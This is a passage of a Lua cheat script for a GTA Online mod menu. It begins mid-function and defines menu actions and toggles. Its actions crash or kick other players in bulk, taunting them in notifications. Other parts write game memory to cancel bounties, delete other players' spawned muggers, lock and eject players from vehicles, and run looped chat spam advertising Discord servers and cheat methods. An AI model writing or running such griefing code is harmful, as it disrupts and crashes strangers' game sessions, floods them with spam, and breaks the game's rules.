		for pids = 0, 31 do
			if excludeselected then
				if pids ~= players.user() and not selectedplayer[pids] and players.exists(pids) then
					menu.trigger_commands("crash" .. PLAYER.GET_PLAYER_NAME(pids))
					notification("Pow right in the kisser " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
				end
			else
				if pids ~= players.user() and selectedplayer[pids] and players.exists(pids) then
					menu.trigger_commands("crash" .. PLAYER.GET_PLAYER_NAME(pids))
					notification("Pow right in the kisser " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
				end
			end
		end
	end)

    	menu.action(custselc, "Network Bail", {networkbail}, "", function()
		for pids = 0, 31 do
			if excludeselected then
				if pids ~= players.user() and not selectedplayer[pids] and players.exists(pids) then
					menu.trigger_commands("kick" .. PLAYER.GET_PLAYER_NAME(pids))
					notification("Get fucked off " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
				end
			else
				if pids ~= players.user() and selectedplayer[pids] and players.exists(pids) then
					menu.trigger_commands("kick" .. PLAYER.GET_PLAYER_NAME(pids))
					notification("Get fucked off " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
				end
			end
		end
	end)

	menu.action(custselc, "Kick", {}, "", function()
		for pids = 0, 31 do
			if excludeselected then
				if pids ~= players.user() and not selectedplayer[pids] and players.exists(pids) then
                    menu.trigger_commands("kick " .. PLAYER.GET_PLAYER_NAME(pids))
					util.yield()
				end
			else
				if pids ~= players.user() and selectedplayer[pids] and players.exists(pids) then
                    menu.trigger_commands("kick " .. PLAYER.GET_PLAYER_NAME(pids))
					util.yield()
				end
			end
		end
	end)

	menu.divider(custselc, "GG's")

	for pids = 0, 31 do
		if players.exists(pids) then
			cmd_id[pids] = menu.toggle(custselc, tostring(PLAYER.GET_PLAYER_NAME(pids)), {}, "PID - ".. pids, function(on_toggle)
				if on_toggle then
					selectedplayer[pids] = true
				else
					selectedplayer[pids] = false
				end
			end)
		end
	end


	protex = menu.list(menu.my_root(), "Stop Net Shit", {}, "", function(); end)
    	local pidsacam = menu.list(protex, "Anti Crash Camera", {}, "")

	local BlockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Enabled")
	local UnblockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Disabled")
	local BlockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Enabled")
	local UnblockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Disabled")

	menu.action(pidsacam, "Anti Crash Camera On", {"acam"}, "Activates ped regen, invisibility, levitate, freecam, reducedcollision, nocollision, showcamall, confusecamall, potatomode, stops all sound events and blocks all connections", function()
		notification("Toggling Anti Crash Camera On", colors.blue)
		if PED.IS_PED_MALE(PLAYER.PLAYER_PED_ID()) then
			menu.trigger_commands("mpfemale")
			menu.trigger_commands("tphigh")
			menu.trigger_commands("invisibility" .. " On")
			menu.trigger_commands("levitate" .. " On")
			menu.trigger_commands("freecam" .. " On")
			menu.trigger_commands("potatomode on")
    			menu.trigger_commands("nosky on")
			menu.trigger_commands("reducedcollision" .. " On")
			menu.trigger_commands("nocollision" .. " On")
			menu.trigger_commands("showcamall" .. " On")
			menu.trigger_commands("confuseall" .. " On")
			menu.trigger_commands("desyncall on")
			menu.trigger_command(BlockIncSyncs)
			menu.trigger_command(BlockNetEvents)
			menu.trigger_commands("superc")
			menu.trigger_commands("clean")
		end
	
	end)

	menu.action(pidsacam, "Anti Crash Camera Off", {"acamoff"}, "Deactivates ped regen,invisibility, levitate, freecam, reducedcollision, nocollision, showcamall, confusecamall, potatomode, stops all sound events and unblocks all connections", function()
		notification("Toggling Anti Crash Camera Off", colors.blue)
		for i=-1,100 do
			AUDIO.STOP_SOUND(i)
			AUDIO.RELEASE_SOUND_ID(i)
			end
		notification("Force Stopped All Sound Events", colors.green)
		if PED.IS_PED_MALE(PLAYER.PLAYER_PED_ID()) then
		notification("Removed Attachments", colors.green)
			menu.trigger_commands("mpfemale")
			menu.trigger_commands("tpmyspot")
			menu.trigger_commands("invisibility" .. " Off")
			menu.trigger_commands("levitate" .. " Off")
			menu.trigger_commands("freecam" .. " Off")
			menu.trigger_commands("potatomode off")
			menu.trigger_commands("reducedcollision" .. " Off")
			menu.trigger_commands("nocollision" .. " Off")
			menu.trigger_commands("showcamall" .. " Off")
			menu.trigger_commands("confuseall" .. " Off")
			menu.trigger_commands("desyncall off")
			menu.trigger_command(UnblockIncSyncs)
			menu.trigger_command(UnblockNetEvents)
			menu.trigger_commands("superc")
			menu.trigger_commands("clean")
			util.toast("Note: Change your outfit in the interaction menu to reset online ped")
		end
	
	end)


local anti_bounty = menu.list(protex, "Anti-Bounty's")

menu.action(anti_bounty, "Anti-Bounty", {"bountyoff"}, "Turns off bounty's.", function()
if memory.read_int(memory.script_global(1835502 + 4 + 1 + (players.user() * 3))) == 1 then 
 memory.write_int(memory.script_global(2815059 + 1856 + 17), -1)
 memory.write_int(memory.script_global((2359296+1) + 5149 + 13), 2880000)
else
    util.toast("You don't currently have a bounty bitch! xD.")
    end
end)

menu.toggle_loop(anti_bounty, "Anti-Bounty's", {"bountysoff"}, "Turns off bounty's. Keep toggled if bounty's persist", function()
if memory.read_int(memory.script_global(1835502 + 4 + 1 + (players.user() * 3))) == 1 then 
 memory.write_int(memory.script_global(2815059 + 1856 + 17), -1)
 memory.write_int(memory.script_global((2359296+1) + 5149 + 13), 2880000)
else
    end
end)

local anti_mugger = menu.list(protex, "Block Muggers")

menu.toggle_loop(anti_mugger, "Anti-Mugger", {}, "Prevents you from being mugged", function() -- thx nowiry for improving my method :D
    if NETWORK.NETWORK_IS_SCRIPT_ACTIVE("am_gang_call", 0, true, 0) then
        local ped_netId = memory.script_local("am_gang_call", 63 + 10 + (0 * 7 + 1))
        local sender = memory.script_local("am_gang_call", 287)
        local target = memory.script_local("am_gang_call", 288)
        local player = players.user()

        util.spoof_script("am_gang_call", function()
            if (memory.read_int(sender) ~= player and memory.read_int(target) == player 
            and NETWORK.NETWORK_DOES_NETWORK_ID_EXIST(memory.read_int(ped_netId)) 
            and NETWORK.NETWORK_REQUEST_CONTROL_OF_NETWORK_ID(memory.read_int(ped_netId))) then
                local mugger = NETWORK.NET_TO_PED(memory.read_int(ped_netId))
                entities.delete_by_handle(mugger)
                util.toast("Blocked mugger from " .. players.get_name(memory.read_int(sender)))
            end
        end)
    end
end)


menu.toggle_loop(anti_mugger, "Someone Else", {}, "Prevents others from being mugged.", function()
    if NETWORK.NETWORK_IS_SCRIPT_ACTIVE("am_gang_call", 0, true, 0) then
        local ped_netId = memory.script_local("am_gang_call", 63 + 10 + (0 * 7 + 1))
        local sender = memory.script_local("am_gang_call", 287)
        local target = memory.script_local("am_gang_call", 288)
        local player = players.user()

        util.spoof_script("am_gang_call", function()
            if memory.read_int(target) ~= player and memory.read_int(sender) ~= player
            and NETWORK.NETWORK_DOES_NETWORK_ID_EXIST(memory.read_int(ped_netId)) 
            and NETWORK.NETWORK_REQUEST_CONTROL_OF_NETWORK_ID(memory.read_int(ped_netId)) then
                local mugger = NETWORK.NET_TO_PED(memory.read_int(ped_netId))
                entities.delete_by_handle(mugger)
                util.toast("Block mugger sent by " .. players.get_name(memory.read_int(sender)) .. " to " .. players.get_name(memory.read_int(target)))
            end
        end)
    end
end)


menu.toggle_loop(protex, "Anti-Beast", {}, "Prevents you from being turned into the beast but will also stop the event for others.", function()
    if util.spoof_script("am_hunt_the_beast", SCRIPT.TERMINATE_THIS_THREAD) then
        util.toast("Hunt the beast script detected. Terminating script...")
    end
end)

	menu.toggle_loop(protex, "Clear Notifications", {"clearnotifs"}, "Clears notifs above mini map", function(on_toggle)
		if on then
			menu.trigger_commands("clearnotifications")
			util.yield(1000000)
		else
			menu.trigger_commands("clearnotifications")
		end
	
	end)


	menu.action(protex, "Force Stop all sound events", {"stopsounds"}, "", function()
		for i=-1,100 do
			AUDIO.STOP_SOUND(i)
			AUDIO.RELEASE_SOUND_ID(i)
		end
	end)

	menu.action(protex, "Remove Attachments", {"remove attachments"}, "Cleans your ped of all attachments by regenerating it", function()
		notification("Removing Attachments", colors.red)
		if PED.IS_PED_MALE(PLAYER.PLAYER_PED_ID()) then
			menu.trigger_commands("mpmale")
		else
			menu.trigger_commands("mpfemale")
		end
	
	end)

	menu.click_slider(protex,"Clear Shit Up", {"superc"}, "5 = peds, 4 = vehicles, 3 = objects, 2 = pickups, 1 = all \nNote: This excludes players and their vehicles.", 1, 5, 1, 1, function(on_change)
		if on_change == 5 then
			local count = 0
			for k,ent in pairs(entities.get_all_peds_as_handles()) do
				if not PED.IS_PED_A_PLAYER(ent) then
					ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
					entities.delete_by_handle(ent)
					util.yield()
					count = count + 1
				end
			end
			notification(count .. " Peds have been fucked off", colors.green)
		end
		if on_change == 4 then
			local count = 0
			for k, ent in pairs(entities.get_all_vehicles_as_handles()) do
				local PedInSeat = VEHICLE.GET_PED_IN_VEHICLE_SEAT(ent, -1, false)
				if not PED.IS_PED_A_PLAYER(PedInSeat) then
					ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
					entities.delete_by_handle(ent)
					util.yield()
					count = count + 1
				end
			end
			notification(count .. "  Vehicles slung", colors.green)
			return
		end
		if on_change == 3 then
			local count = 0
			for k,ent in pairs(entities.get_all_objects_as_handles()) do
				ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
				entities.delete_by_handle(ent)
				count = count + 1
				util.yield()
			end
			notification(count .. " Objects fucked", colors.green)
			return
		end
		if on_change == 2 then
			local count = 0
			for k, ent in pairs(entities.get_all_pickups_as_handles()) do
				ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
				entities.delete_by_handle(ent)
				count = count + 1
				util.yield()
			end
			notification(count .. " Pickups have been bruhh", colors.green)
			return
		end
		if on_change == 1 then
			local count = 0
			for k, ent in pairs(entities.get_all_peds_as_handles()) do
				if not PED.IS_PED_A_PLAYER(ent) then
					ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
					entities.delete_by_handle(ent)
					util.yield()
					count = count + 1
				end
			end

			for k, ent in pairs(entities.get_all_vehicles_as_handles()) do
				local PedInSeat = VEHICLE.GET_PED_IN_VEHICLE_SEAT(ent, -1, false)
				if not PED.IS_PED_A_PLAYER(PedInSeat) then
					ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
					entities.delete_by_handle(ent)
					util.yield()
					count = count + 1
				end
			end

			for k,ent in pairs(entities.get_all_objects_as_handles()) do
				ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
				entities.delete_by_handle(ent)
				count = count + 1
				util.yield()
			end
		


			for k,ent in pairs(entities.get_all_pickups_as_handles()) do
				ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
				entities.delete_by_handle(ent)
				count = count + 1
				util.yield()
			end
			notification(count .. "All Cleared :) ", colors.green)
			util.toast("All Cleared " .. count .. " entities removed. :)")
			return
		end
	end)

	menu.action(protex, "Super Clean Shit", {"clean"}, "Attempt to fuck every single entity without exception. Not recommended but fuck it", function(on_click)
		local ct = 0
		for k,ent in pairs(entities.get_all_vehicles_as_handles()) do
			ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
			entities.delete_by_handle(ent)

			ct = ct + 1
		end
		util.toast("Pooped all vehicles!")
		for k,ent in pairs(entities.get_all_peds_as_handles()) do
			if not PED.IS_PED_A_PLAYER(ent) then
				ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
				entities.delete_by_handle(ent)

			end
			ct = ct + 1
		end
		util.toast("Shagged all peds AUUUUUGGH!!!")
		for k,ent in pairs(entities.get_all_objects_as_handles()) do
			if ent ~= PLAYER.PLAYER_PED_ID() then
				ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
				entities.delete_by_handle(ent)
				ct = ct + 1
			end
		end
		util.toast("Gobbled all pickups nom nom!")
		util.toast("Fucked Everything off " .. ct .. " Entities removed. :)")
		notification("Shit cleaned nom nom > " .. ct .. "Entities", colors.green)
			for k,ent in pairs(entities.get_all_pickups_as_handles()) do
				ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
				entities.delete_by_handle(ent)
				util.yield()
			return
		end
	end)

	menu.toggle_loop(protex, "No Entity Spawn", {"noentities"}, "De spawns all entites.", function(on_loop)
		local ct = 0
		for k,ent in pairs(entities.get_all_vehicles_as_handles()) do
			ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
			entities.delete_by_handle(ent)

			ct = ct + 1
		end
		for k,ent in pairs(entities.get_all_peds_as_handles()) do
			if not PED.IS_PED_A_PLAYER(ent) then
				ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
				entities.delete_by_handle(ent)

			end
			ct = ct + 1
		end
		for k,ent in pairs(entities.get_all_objects_as_handles()) do
			if ent ~= PLAYER.PLAYER_PED_ID() then
				ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
				entities.delete_by_handle(ent)
				ct = ct + 1
			end
		end
			for k,ent in pairs(entities.get_all_pickups_as_handles()) do
				ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
				entities.delete_by_handle(ent)
				util.yield()
			return
		end
	end)

	menu.divider(protex, "Currupt Protections")
	
	
	menu.toggle(protex, "Toggle Block all Network Events", {}, "This breaks the game, so only leave it on if you are worried about an incoming modder attack", function(on_toggle)
		local BlockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Enabled")
		local UnblockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Disabled")
		if on_toggle then
			menu.trigger_command(BlockNetEvents)
			notification("Toggling block all network events on... Get those cunts!", colors.red)
		else
			menu.trigger_command(UnblockNetEvents)
			notification("Toggling block all network events off...", colors.red)
		end
	end)


	menu.toggle(protex, "Toggle Block all Incoming Syncs", {}, "This breaks the game, so only leave it on if you are worried about an incoming modder attack", function(on_toggle)
		local BlockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Enabled")
		local UnblockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Disabled")
		if on_toggle then
			menu.trigger_command(BlockIncSyncs)
			notification("Toggling block all incoming syncs on... Get those cunts!", colors.red)
		else
			menu.trigger_command(UnblockIncSyncs)
			notification("toggling block all incoming syncs off...", colors.red)
		end
	end)

	menu.toggle(protex, "Toggle Block all Outgoing Syncs", {}, "This breaks the game, and other players will not receive any updates from your client", function(on_toggle)
		if on_toggle then
			notification("Toggling block all outgoing syncs on", colors.red)
			menu.trigger_commands("desyncall on")
		else
			notification("Toggling block all outgoing syncs off", colors.red)
			menu.trigger_commands("desyncall off")
		end
	end)

	menu.toggle(protex, "Toggle Anticrashcam", {"acc"}, "Put this here for redundancy", function(on_toggle)
		if on_toggle then
			notification("Toggling anticrashcam... Get those cunts", colors.red)
			menu.trigger_commands("anticrashcam on")
			menu.trigger_commands("potatomode on")
		else
			notification("Toggling anticrashcam off...", colors.red)
			menu.trigger_commands("anticrashcam off")
			menu.trigger_commands("potatomode off")
		end
	end)

	menu.toggle(protex, "Toggle Panic Mode", {"panic"}, "This will render you basically uncrashable at the cost of disrupting all gameplay", function(on_toggle)
		local BlockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Enabled")
		local UnblockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Disabled")
		local BlockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Enabled")
		local UnblockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Disabled")
		if on_toggle then
			notification("Toggling panic mode on... Get those cunts", colors.red)
			menu.trigger_commands("desyncall on")
			menu.trigger_command(BlockIncSyncs)
			menu.trigger_command(BlockNetEvents)
			menu.trigger_commands("anticrashcamera on")
		else
			notification("toggling panic mode off...", colors.red)
			menu.trigger_commands("desyncall off")
			menu.trigger_command(UnblockIncSyncs)
			menu.trigger_command(UnblockNetEvents)
			menu.trigger_commands("anticrashcamera off")
		end
	end)

	spams = menu.list(menu.my_root(), "Chat Spammers", {}, "", function(); end)
	menu.divider(spams, "Chat Spammers")

menu.toggle_loop(spams, "Join Kwengz Discord", {"khoslink"}, "", function(on_toggle)
    chat.send_message(
        "Please Join Our Discord > discord.gg/KHOS < Mod menu Giveaways From Kwengz Server! #KWENGZ-IS-KING",
        false, -- in team chat
        true, -- add to local history
        true  -- networked
        )
    util.yield(150000)
end)

menu.toggle_loop(spams, "Join Kwengz Discord Candy's Link", {"kwengzlink"}, "", function(on_toggle)
    chat.send_message(
        "Please Join Our Discord > discord.gg/CMxfrbvdm7 < Mod menu Giveaways From Kwengz Server! #KWENGZ-IS-KING",
        false, -- in team chat
        true, -- add to local history
        true  -- networked
        )
    util.yield(150000)
end)

menu.toggle_loop(spams, "Join Currupt Script Discord Link", {"curruptlink"}, "", function(on_toggle)
    chat.send_message(
        "Please Join Currupt Script Discord > discord.gg/d6ZnaQakpY < Open discord hit the + to join server and type my link!",
        false, -- in team chat
        true, -- add to local history
        true  -- networked
        )
    util.yield(150000)
end)

menu.toggle_loop(spams, "Join CandyPie Mods Discord Link", {"candylink"}, "", function(on_toggle)
    chat.send_message(
        "Please Join Currupt Script Discord > discord.gg/XHhqfbaqTN < Open discord hit the + to join server and type my link!",
        false, -- in team chat
        true, -- add to local history
        true  -- networked
        )
    util.yield(150000)
end)

menu.toggle_loop(spams, "Gift Car A", {""}, "", function(on_toggle)
    chat.send_message(
        "Fill a garage with LOW END/FREE cars in a 2 car garage order 2 free or cars steal them!",
        false, -- in team chat
        true, -- add to local history
        true  -- networked
        )
    util.yield(150000)
end)

menu.toggle_loop(spams, "Gift Car B", {""}, "", function(on_toggle)
    chat.send_message(
        "Put away all your personal vehicles! Type: /spawn NAME then go to garage and type /gift YOURNAME",
        false, -- in team chat
        true, -- add to local history
        true  -- networked
        )
    util.yield(150000)
end)

menu.toggle_loop(spams, "Gift Car C", {""}, "", function(on_toggle)
    chat.send_message(
        "Repete first steps to do it again",
        false, -- in team chat
        true, -- add to local history
        true  -- networked
        )
    util.yield(150000)
end)

menu.toggle_loop(spams, "Commands A", {""}, "", function(on_toggle)
    chat.send_message(
        "Command list: /ceopayNAME - /givecollectiblesNAME - /rpNAME  - /armNAME - /ammoNAME - /autohealNAME - /bailNAME - /giveotrNAME",
        false, -- in team chat
        true, -- add to local history
        true  -- networked
        )
    util.yield(150000)
end)

menu.toggle_loop(spams, "Commands B", {""}, "", function(on_toggle)
    chat.send_message(
        "/armNAME /ammoNAME /autohealNAME /bailNAME- No Cops /giveotrNAME - Off the Radar",
        false, -- in team chat
        true, -- add to local history
        true  -- networked
        )
    util.yield(150000)
end)

menu.toggle_loop(spams, "Money Drop Method", {""}, "", function(on_toggle)
    chat.send_message(
        "If you want new safe money method type /cashNAME 3600 its a timer not ammount if faster than 3600 you just get errors /cashNAME 0 to stop",
        false, -- in team chat
        true, -- add to local history
        true  -- networked
        )
    util.yield(150000)
end)

menu.toggle_loop(spams, "Roulette Method", {""}, "", function(on_toggle)
    chat.send_message(
        "If u wunna make money come to casino play roulette and bet max on 1st 12(50k) and Red 1(5k), win 3 loose 1 550k a minute",
        false, -- in team chat
        true, -- add to local history
        true  -- networked
        )
    util.yield(150000)
end)

menu.toggle_loop(spams, "Blackjack Method", {""}, "", function(on_toggle)
    chat.send_message(
        "If u wunna make money come to casino play blackjack! Click max bet then hit stand and win 2x your bet!",
        false, -- in team chat
        true, -- add to local history
        true  -- networked
        )
    util.yield(150000)
end)

menu.toggle_loop(spams, "What Menu Do I Use?", {"lolmenu"}, "", function(on_toggle)
    chat.send_message(
        "I use Stand Ultimate, 2take1 VIP, Midnight, Nightfall, Cherax all co loaded and I'm waiting for North update... :) ",
        false, -- in team chat
        true, -- add to local history
        true  -- networked
        )
    util.yield(150000)
end)

menu.toggle_loop(spams, "I'm Fucking God", {""}, "", function(on_toggle)
    chat.send_message(
        "I'M FUCKING GOD!!!",
        false, -- in team chat
        true, -- add to local history
        true  -- networked
        )
    util.yield(50)
end)

menu.toggle_loop(spams, "Report Me", {""}, "", function(on_toggle)
    chat.send_message(
        "REPORT ME!!!",
        false, -- in team chat
        true, -- add to local history
        true  -- networked
        )
    util.yield(50)
end)

menu.toggle_loop(spams, "I <3 VOLOD", {""}, "Russians hate this ;)", function(on_toggle)
    chat.send_message(
        "I <3 PRESIDENT VOLODYMYR ZELENSKYY",
        false, -- in team chat
        true, -- add to local history
        true  -- networked
        )
    util.yield(50)
end)

----------------------Fun Shit-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

util.keep_running()
local player = players.user_ped()
local agroup = "missfbi3ig_0"
local anim = "shit_loop_trev"
local mshit = util.joaat("prop_big_shit_02")
local rshit = util.joaat("prop_big_shit_01")

list = menu.list(funfun, "Poop", {"lpoop"}, "Poo list", function(); end)

menu.action(list, "Massive shit", {"mshit"}, "Make a massive shit", function()
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    c.z = c.z -1
    while not STREAMING.HAS_ANIM_DICT_LOADED(agroup) do 
        STREAMING.REQUEST_ANIM_DICT(agroup)
        util.yield()
    end
    TASK.TASK_PLAY_ANIM(player, agroup, anim, 8.0, 8.0, 3000, 0, 0, true, true, true)
    util.yield(1000)
    entities.create_object(mshit, c)
end)

menu.action(list, "Normal shit", {"nshit"}, "Make a normale sized shit", function()
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    c.z = c.z -1
    while not STREAMING.HAS_ANIM_DICT_LOADED(agroup) do 
        STREAMING.REQUEST_ANIM_DICT(agroup)
        util.yield()
    end
    TASK.TASK_PLAY_ANIM(player, agroup, anim, 8.0, 8.0, 3000, 0, 0, true, true, true)
    util.yield(1000)
    entities.create_object(rshit, c)
end)

menu.slider(funfun, "Change seat", {"switchseat"}, "DriverSeat = -1 Passenger = 0 Left Rear = 1 RightRear = 2", -1, 2, -1, 1, function(seatnumber)
	local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user())
	local vehicle = entities.get_user_vehicle_as_handle()
	PED.SET_PED_INTO_VEHICLE(ped, vehicle, seatnumber)
end)


------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
local windows = {
    {name = "Front Left", number = 0},
    {name = "Front Right", number = 1},
    {name = "Rear Left", number = 2},
    {name = "Rear Right", number = 3},
    {name = "Front Windscreen", number = 4},
    {name = "Rear Windscreen", number = 5},
    {name = "Mid Left", number = 6},
    {name = "Mid Right", number = 7}
}

drawScriptMenu = function()


local wrolls = menu.list(funfun, "Roll Windows", {}, "", function(); end)

ROLL_DOWN_INDIVIDUAL = menu.list(wrolls, "Roll down individual windows")
    for k, v in pairs(windows) do
        menu.action(ROLL_DOWN_INDIVIDUAL, "Roll down " .. v.name .. " window", {}, "Rolls down " .. v.name .. " window", function()
        currentVehicle = entities.get_user_vehicle_as_handle()
        VEHICLE.ROLL_DOWN_WINDOW(currentVehicle, v.number)
        end)
    end
ROLL_UP_INDIVIDUAL = menu.list(wrolls, "Roll up individual windows")
    for k, v in pairs(windows) do
        menu.action(ROLL_UP_INDIVIDUAL, "Roll up " .. v.name .. " window", {}, "Rolls up " .. v.name .. " window", function()
        currentVehicle = entities.get_user_vehicle_as_handle()
        VEHICLE.ROLL_UP_WINDOW(currentVehicle, v.number)
        end)
    end

menu.action(wrolls, "Roll all down", {"pwcalldown"}, "Rolls all windows of the current vehicle down", function()
    currentVehicle = entities.get_user_vehicle_as_handle()
    VEHICLE.ROLL_DOWN_WINDOWS(currentVehicle)
end)
menu.action(wrolls, "Roll all up", {"pwcallup"}, "Rolls all windows of the current vehicle up", function()
    for k, v in pairs(windows) do
        currentVehicle = entities.get_user_vehicle_as_handle()
        VEHICLE.ROLL_UP_WINDOW(currentVehicle, v.number)
    end
end)

menu.action(wrolls, "Roll down front windows", {"pwcfrontdown"}, "Rolls the front left/front right windows down. Probably the most relevant", function()
    currentVehicle = entities.get_user_vehicle_as_handle()
    VEHICLE.ROLL_DOWN_WINDOW(currentVehicle, 0)
    VEHICLE.ROLL_DOWN_WINDOW(currentVehicle, 1)
end)
menu.action(wrolls, "Roll down rear windows", {"pwcreardown"}, "Rolls the rear left/rear right windows down", function()
    currentVehicle = entities.get_user_vehicle_as_handle()
    VEHICLE.ROLL_DOWN_WINDOW(currentVehicle, 2)
    VEHICLE.ROLL_DOWN_WINDOW(currentVehicle, 3)
end)

end



drawScriptMenu()

	playermode = menu.list(funfun, "Player Modes", {}, "", function(); end)

menu.toggle(playermode, "Hulk Mode", {"hulkmode"}, "Makes you jump high and very strong", function(toggle)
    if toggle then
        menu.trigger_commands("damagemultiplier 10000")
        menu.trigger_commands("superjump")
util.toast("Hulk Mode On")
    else
    menu.trigger_commands("damagemultiplier 1.01")
    menu.trigger_commands("damagemultiplier 1")
        menu.trigger_commands("superjump")
util.toast("Hulk Mode Off")
    end 
end)

menu.toggle(playermode, "Big Foot Mode", {"bigfoot mode"}, "Activates Big Foot off radar and makes you strong and jump high then to Candy's outfit on radar.", function(on)
if on then
    menu.trigger_commands("igorleans")
        menu.trigger_commands("damagemultiplier 10000")
        menu.trigger_commands("superjump")
    menu.trigger_commands("walkstyle verydrunk")
    menu.trigger_commands("otr")
util.toast("Big Foot Mode On") 
else
    menu.trigger_commands("outfit1candydinka")
    menu.trigger_commands("walkstyle poshfemale")
    menu.trigger_commands("damagemultiplier 1.01")
    menu.trigger_commands("damagemultiplier 1")
        menu.trigger_commands("superjump")
    menu.trigger_commands("otr")
util.toast("Candy Mode On")
    end 
end)

menu.toggle(playermode, "Stunt Monkey Mode", {"stuntmonkey"}, "Activates Chimp and makes you jump high then to Candy's outfit.", function(on)
if on then
    menu.trigger_commands("acchimp")
        menu.trigger_commands("superjump")
    menu.trigger_commands("walkstyle mop")
util.toast("Stunt Monkey Mode On") 
else
    menu.trigger_commands("outfit1candydinka")
    menu.trigger_commands("walkstyle poshfemale")
        menu.trigger_commands("superjump")
util.toast("Candy Mode On")
    end 
end)


	trevs = menu.list(playermode, "Trevor Mode", {}, "", function(); end)

menu.toggle(trevs, "Trevor Mode 1", {"trevormode"}, "Activates pervy Trev off radar then to Candy's outfit on radar.", function(on)
if on then
    menu.trigger_commands("trevor")
    menu.trigger_commands("walkstyle verydrunk")
    menu.trigger_commands("otr")
util.toast("Trevor Mode 1 On") 
else
    menu.trigger_commands("outfit1candydinka")
    menu.trigger_commands("walkstyle poshfemale")
    menu.trigger_commands("otr")
util.toast("Candy Mode On")
    end 
end)

menu.toggle(trevs, "Trevor Mode 2", {"trevormode"}, "Activates pervy Trev off radar then to Candy's outfit on radar.", function(on)
if on then
    menu.trigger_commands("outfit1trevor")
    menu.trigger_commands("walkstyle crouched")
    menu.trigger_commands("otr")
util.toast("Trevor Mode 2 On") 
else
    menu.trigger_commands("outfit1candydinka")
    menu.trigger_commands("walkstyle poshfemale")
    menu.trigger_commands("otr")
util.toast("Candy Mode On")
    end 
end)

	menu.toggle(funfun, "2nd Person Perspective", {"2ndpp"}, "Sets your camera in another players/npc's face", function(on_toggle)
			notification("Hahahah look at meeee xD", colors.red)
			menu.trigger_commands("2ndperson")
	end)

-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

	worldchaos = menu.list(menu.my_root(), "Chaos Shit", {}, "", function(); end)
	menu.divider(worldchaos, "Chaos mode")


	menu.toggle(worldchaos, "Enable", {"chaos"}, "", function(on)
		if on then
			chaos = true
		else
			chaos = false
		end
	end, false)

	menu.toggle(worldchaos, "Gravity", {"chaosgrav"}, "", function(on)
		if on then
			gravity = true
		else
			gravity = false
		end
	end, false)

	menu.click_slider(worldchaos, "Power", {"chaospower"}, "", 30, 300, 100, 10, function(s)
	speed = s
	end)

	menu.divider(worldchaos, "Oppressor blacklisting")
	kick_players = false
	menu.toggle(worldchaos, "On", {"Antioppressor"}, "Automatically kicks players off oppressor mkii's", function(on)
		kick_players = on
	end, false)

	lock_vehicle = false
	menu.toggle(worldchaos, "Lock vehicle", {"lockmk2"}, "Permanently locks the vehicle to prevent further use", function(on)
		lock_vehicle = on
	end, false)

	target_self = false
	menu.toggle(worldchaos, "Target self", {"targetselfmk2"}, "Targets your mk2's as well (this is stupid)", function(on)
		target_self = on
	end, false)

	target_friends = false
	menu.toggle(worldchaos, "Target friends", {"targetfriendsmk2"}, "Targets your friends' mk2's as well", function(on)
		target_friends = on
	end, false)

	menu.divider(worldchaos, "Other Shit")

	objectghosting = false
	menu.toggle(worldchaos, "Disable Vehicle Collision with Objects", {"GhostObjects"}, "Pairs well with ghostvehicles in stand", function(enabled)
		objectghosting = enabled
	end)

	drift = false
	menu.toggle(worldchaos, "Shift to Drift", {"driftmode"}, "", function(on_toggle)
		drift = on_toggle
	end)

	local dont_stop = false
	menu.toggle_loop(worldchaos,"Vehicle Fly Nearby vehicles", {"vehflyall"}, "basically 'impulse like sport mode' but applied to every vehicle", function()
		for k, veh in pairs(entities.get_all_vehicles_as_handles()) do
			local PedInSeat = VEHICLE.GET_PED_IN_VEHICLE_SEAT(veh, -1, false)
			if not PED.IS_PED_A_PLAYER(PedInSeat) then
				NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
				cam_pos = CAM.GET_GAMEPLAY_CAM_ROT(0)
    			ENTITY.SET_ENTITY_ROTATION(veh, cam_pos.x, cam_pos.y, cam_pos.z, 1, true);
				local locspeed = speed*10
